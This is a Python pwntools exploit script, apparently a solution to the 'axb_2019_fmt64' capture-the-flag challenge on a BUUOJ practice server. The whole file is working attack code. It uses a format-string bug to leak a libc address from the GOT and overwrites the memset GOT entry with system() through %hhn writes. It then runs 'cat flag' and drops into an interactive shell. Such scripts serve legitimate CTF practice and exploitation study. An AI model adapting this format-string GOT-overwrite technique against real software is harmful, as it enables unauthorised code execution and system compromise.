import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=process('./p1KkHeap')
			io=process(['./axb_2019_fmt64'],env={'LD_PRELOAD':'/lib/x86_64-linux-gnu/libc.so.6'})
			elf=ELF('./axb_2019_fmt64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26887)
			elf=ELF('./axb_2019_fmt64')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


		io.recv()
		pay='%16$s%80$p'.ljust(0x40,'\x00')+p64(elf.got['read'])
		io.send(pay)
		libc_base=u64(io.recvuntil('0x')[0x9:0xf]+'\x00\x00')-libc.sym['read']
		stack_addr=int(io.recv()[:12],16)-(0x7ffdf47e7e20-0x7ffdf47e7af0)
		libc.address=libc_base
		system_addr=libc.sym['system']
		arg0=(system_addr&0xff)
		arg1=(system_addr&0xff00)>>8
		arg2=(system_addr&0xff0000)>>16

		arg_0=arg0
		arg_1=(arg1-arg0+256)%256
		arg_2=(arg2-arg1+256)%256


		print hex(arg0)
		print hex(arg1)
		print hex(arg2)
		pay='/bin/sh;%'+str(arg_0-17)+'c%16$hhn%'+str(arg_1)+'c%17$hhn%'+str(arg_2)+'c%18$hhn'
		pay=pay.ljust(0x40,'\x00')
		pay+=p64(elf.got['memset'])
		pay+=p64(elf.got['memset']+1)
		pay+=p64(elf.got['memset']+2)
		# gdb.attach(io,'b printf')
		io.send(pay)
		io.sendline('cat flag')
		io.recv()
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io,'b printf')
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue